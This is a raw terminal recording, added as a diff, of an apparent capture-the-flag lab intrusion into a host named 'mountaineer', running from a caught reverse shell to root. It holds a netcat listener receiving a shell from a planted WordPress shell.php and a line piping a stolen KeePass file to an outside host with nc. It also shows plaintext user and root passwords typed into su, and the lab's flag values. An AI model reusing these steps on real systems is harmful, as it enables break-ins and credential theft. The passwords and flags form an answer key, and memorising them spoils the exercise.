@@ -1,0 +1,243 @@
+
+Script started on 2025-01-13 19:11:43+03:00 [COMMAND="nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+listening on [any] 4444 ...
+connect to [10.9.3.166] from (UNKNOWN) [10.10.141.39] 40802
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@mountaineer:~/html/wordpress/wp-content/uploads$ ls
+ls
+2024  2025  shell.php
+www-data@mountaineer:~/html/wordpress/wp-content/uploads$ cd
+cd
+www-data@mountaineer:~$ pwd
+pwd
+/var/www
+www-data@mountaineer:~$ cd /home
+cd /home
+www-data@mountaineer:/home$ ls
+ls
+annapurna  everest  k2	kangchenjunga  lhotse  makalu  manaslu	nanga  vagrant
+www-data@mountaineer:/home$ ls -al
+ls -al
+total 44
+drwxr-xr-x 11 root    root    4096 Mar 16  2024 .
+drwxr-xr-x 21 root    root    4096 Mar 16  2024 ..
+drwxr-xr-x  2 root    root    4096 Apr  6  2024 annapurna
+drwxr-xr-x  2 root    root    4096 Apr  6  2024 everest
+drwxr-xr-x  3 k2      k2      4096 Apr  6  2024 k2
+drwxr-xr-x  2 root    root    4096 Mar 18  2024 kangchenjunga
+drwxr-xr-x  3 lhotse  lhotse  4096 Apr  6  2024 lhotse
+drwxr-xr-x  2 root    root    4096 Apr  6  2024 makalu
+drwxr-xr-x  2 root    root    4096 Apr  6  2024 manaslu
+drwxr-xr-x  3 nanga   nanga   4096 Apr  6  2024 nanga
+drwxr-x---  5 vagrant vagrant 4096 Apr  6  2024 vagrant
+www-data@mountaineer:/home$ ls -al *
+ls -al *
+annapurna:
+total 8
+drwxr-xr-x  2 root root 4096 Apr  6  2024 .
+drwxr-xr-x 11 root root 4096 Mar 16  2024 ..
+lrwxrwxrwx  1 root root    9 Apr  6  2024 .bash_history -> /dev/null
+
+everest:
+total 8
+drwxr-xr-x  2 root root 4096 Apr  6  2024 .
+drwxr-xr-x 11 root root 4096 Mar 16  2024 ..
+lrwxrwxrwx  1 root root    9 Apr  6  2024 .bash_history -> /dev/null
+
+k2:
+total 12
+drwxr-xr-x  3 k2   k2   4096 Apr  6  2024 .
+drwxr-xr-x 11 root root 4096 Mar 16  2024 ..
+lrwxrwxrwx  1 root root    9 Apr  6  2024 .bash_history -> /dev/null
+drwx------  3 k2   k2   4096 Jan 13 15:56 mail
+
+kangchenjunga:
+total 20
+drwxr-xr-x  2 root          root          4096 Mar 18  2024 .
+drwxr-xr-x 11 root          root          4096 Mar 16  2024 ..
+-rw-r-----  1 kangchenjunga kangchenjunga  303 Mar 18  2024 .bash_history
+-rw-r-----  1 root          kangchenjunga   33 Mar 16  2024 local.txt
+-rw-r-----  1 kangchenjunga kangchenjunga  216 Mar 16  2024 mynotes.txt
+
+lhotse:
+total 16
+drwxr-xr-x  3 lhotse lhotse 4096 Apr  6  2024 .
+drwxr-xr-x 11 root   root   4096 Mar 16  2024 ..
+lrwxrwxrwx  1 root   root      9 Apr  6  2024 .bash_history -> /dev/null
+-rwxrwxrwx  1 lhotse lhotse 2302 Apr  6  2024 Backup.kdbx
+drwx------  3 lhotse lhotse 4096 Mar 16  2024 mail
+
+makalu:
+total 8
+drwxr-xr-x  2 root root 4096 Apr  6  2024 .
+drwxr-xr-x 11 root root 4096 Mar 16  2024 ..
+lrwxrwxrwx  1 root root    9 Apr  6  2024 .bash_history -> /dev/null
+
+manaslu:
+total 8
+drwxr-xr-x  2 root root 4096 Apr  6  2024 .
+drwxr-xr-x 11 root root 4096 Mar 16  2024 ..
+lrwxrwxrwx  1 root root    9 Apr  6  2024 .bash_history -> /dev/null
+
+nanga:
+total 16
+drwxr-xr-x  3 nanga nanga 4096 Apr  6  2024 .
+drwxr-xr-x 11 root  root  4096 Mar 16  2024 ..
+lrwxrwxrwx  1 root  root     9 Apr  6  2024 .bash_history -> /dev/null
+-rw-rw-r--  1 nanga nanga  335 Mar 18  2024 ToDo.txt
+drwx------  3 nanga nanga 4096 Mar 16  2024 mail
+ls: cannot open directory 'vagrant': Permission denied
+www-data@mountaineer:/home$ cat nana ga/To	Do.txt
+cat nanga/ToDo.txt
+Just a gentle reminder to myself:
+
+Even though K2 isn't fond of presents, I can't help but want to get him something special! I'll make sure to mark it on my calendar to pick out a little surprise for him by this weekend.
+
+After all, his birthday may be several months away, but every day with him feels like a celebration of love!!!!
+www-data@mountaineer:/home$ cd lhos tse
+cd lhotse
+www-data@mountaineer:/home/lhotse$ ls
+ls
+Backup.kdbx  mail
+www-data@mountaineer:/home/lhotse$ cat Backup.kdbx                 nc
+nc
+usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
+	  [-m minttl] [-O length] [-P proxy_username] [-p source_port]
+	  [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
+	  [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
+	  [destination] [port]
+www-data@mountaineer:/home/lhotse$ cat Backup.kdbx | nc 10/9/9    .9.3.166 9999
+cat Backup.kdbx | nc 10.9.3.166 9999
+www-data@mountaineer:/home/lhotse$ su k2
+su k2
+Password: k2
+
+k2@mountaineer:/home/lhotse$ sudo -l
+sudo -l
+[sudo] password for k2: k2
+
+Sorry, user k2 may not run sudo on mountaineer.
+k2@mountaineer:/home/lhotse$ cd
+cd
+k2@mountaineer:~$ ls
+ls
+mail
+k2@mountaineer:~$ cd mail
+cd mail
+k2@mountaineer:~/mail$ ls
+ls
+Sent
+k2@mountaineer:~/mail$ cat S     ls -al
+ls -al
+total 20
+drwx------ 3 k2 k2 4096 Jan 13 15:56 .
+drwxr-xr-x 3 k2 k2 4096 Apr  6  2024 ..
+drwx------ 4 k2 k2 4096 Apr  6  2024 .imap
+-rw------- 1 k2 k2  941 Apr  6  2024 Sent
+-rw------- 1 k2 k2   10 Apr  6  2024 .subscriptions
+k2@mountaineer:~/mail$ cat Sent
+cat Sent
+From k2@mountaineer  Sat Apr 06 07:26:13 2024
+MIME-Version: 1.0
+Date: Sat, 06 Apr 2024 03:26:13 -0400
+From: k2 <k2@localhost>
+To: lhotse@localhost.thm
+Subject: Getting to know you!
+Message-ID: <cf409ec2e3fb071c48775daa3715e24c@adminroundcubemail.mountaineer.thm>
+X-Sender: k2@localhost
+Content-Type: text/plain; charset=US-ASCII;
+ format=flowed
+Content-Transfer-Encoding: 7bit
+X-IMAPbase: 1712388336 0000000001
+X-UID: 1
+Status: RO
+X-Keywords:                                                                      
+Content-Length: 406
+
+Dear Lhotse,
+
+We've noticed your consistent warnings about security risks, and we 
+believe it's time to get to know you better. As mountains, we've 
+compiled a list of what we know about you so far:
+
+First Name: Mount
+Surname: Lhotse
+Nickname: MrSecurity
+Birthdate: May 18, 1956
+Pet's Name: Lhotsy
+Company Name: BestMountainsInc
+We're eager to deepen our understanding of you!
+
+Warm regards,
+The Mountains
+
+k2@mountaineer:~/mail$ su kangchenjunga
+su kangchenjunga
+Password: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
+
+kangchenjunga@mountaineer:/home/k2/mail$ cd
+cd
+kangchenjunga@mountaineer:~$ ls
+ls
+local.txt  mynotes.txt
+kangchenjunga@mountaineer:~$ cat local.txt
+cat local.txt
+97a805eb710deb97342a48092876df22
+kangchenjunga@mountaineer:~$ cat mynotes.txt
+cat mynotes.txt
+Those my notes:
+
+1. Tell root stop using my account ! It's annoying !
+2. Travel to Mars sometime, I heard there are great mountains there !
+3. Make my password even harder to crack ! I don't want anyone to hack me !
+kangchenjunga@mountaineer:~$ sudo -l 
+sudo -l 
+[sudo] password for kangchenjunga: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
+
+Sorry, user kangchenjunga may not run sudo on mountaineer.
+kangchenjunga@mountaineer:~$ ^[[D    su
+su
+Password: th3_r00t_of_4LL_mount41NSSSSssssss
+
+root@mountaineer:/home/kangchenjunga# cd
+cd
+root@mountaineer:~# ls
+ls
+note.txt  root.txt  snap
+root@mountaineer:~# cat t root.txt
+cat root.txt
+a41824310a621855d9ed507f29eed757
+root@mountaineer:~# cat note.txt
+cat note.txt
+Dear Adventurers,
+
+I want to express my heartfelt thanks for embarking on this incredible journey to explore the highest mountains with us. Your participation has made this adventure in the wilderness even more remarkable.
+
+As we ascended these towering peaks, we not only embraced the natural challenges but also celebrated the majestic beauty of the highest mountains on our planet. Your spirit of adventure and shared passion for mountaineering have truly enriched this experience.
+
+Thank you for being a part of this remarkable expedition, which has been a tribute to the mightiest mountains and the thrill of reaching new heights.
+
+With sincere gratitude,
+
+The mountaineer
+
+p.s.
+
+This machine was created while climbing ;)
+root@mountaineer:~# exit
+exit
+exit
+kangchenjunga@mountaineer:~$ exit
+exit
+exit
+k2@mountaineer:~/mail$ exit
+exit
+exit
+www-data@mountaineer:/home/lhotse$ exit
+exit
+exit
+$ exit
+
+
+Script done on 2025-01-13 20:06:26+03:00 [COMMAND_EXIT_CODE="0"]
